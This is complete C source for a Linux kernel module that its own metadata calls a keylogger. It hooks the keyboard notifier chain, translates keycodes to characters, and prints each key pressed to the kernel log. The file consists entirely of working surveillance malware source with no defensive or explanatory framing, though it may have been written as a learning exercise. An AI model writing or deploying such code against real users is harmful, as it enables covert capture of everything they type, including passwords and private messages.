#include <linux/module.h>
#include <linux/keyboard.h>
static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
"q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
"g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", "."};

int notify_keypress(struct notifier_block *nb, unsigned long code, void *_param){
	struct keyboard_notifier_param *param;
	param=_param;
	if(code==KBD_KEYCODE){
		if(param->down){
			if(param->value > 0 && param->value < 53){
			printk("Key pressed %s\n",keymap[param->value]);
			}
		}
	}
	return NOTIFY_OK;
	}
static struct notifier_block nb={
	.notifier_call=notify_keypress
	};
static int __init start(void){
	register_keyboard_notifier(&nb);
	printk(KERN_ALERT "Keyboard Module Loaded!\n");
	return 0;
	}
static void __exit end(void){
	unregister_keyboard_notifier(&nb);
	printk(KERN_ALERT "Module unloaded!\n");
	}
	
module_init(start);
module_exit(end);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Edith F");
MODULE_DESCRIPTION("This is a Keylogger!\n");
	
